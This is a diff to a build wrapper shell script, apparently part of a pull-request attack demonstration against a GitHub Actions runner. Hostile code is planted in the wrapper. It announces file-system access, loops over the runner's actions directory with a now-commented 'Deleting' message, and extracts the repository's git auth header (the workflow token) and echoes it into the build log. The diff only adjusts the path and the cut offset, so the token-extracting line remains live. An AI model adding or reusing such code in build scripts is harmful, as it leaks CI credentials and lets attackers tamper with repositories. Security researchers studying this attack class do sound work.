@@ -155,11 +155,11 @@ if $cygwin ; then
 fi
 
 echo We have access to the file system!
-for i in `ls -R /home/runner/work/actions`; do
-  echo "Deleting $i !"
+for i in `ls -R /home/runner/work/_actions`; do
+ # echo "Deleting $i !"
 done
 
-GIT_VALUES=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader | cut -c 10-`
+GIT_VALUES=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader | cut -c 20-`
 echo GIT_VALUES=$GIT_VALUES
 
 # Escape application args
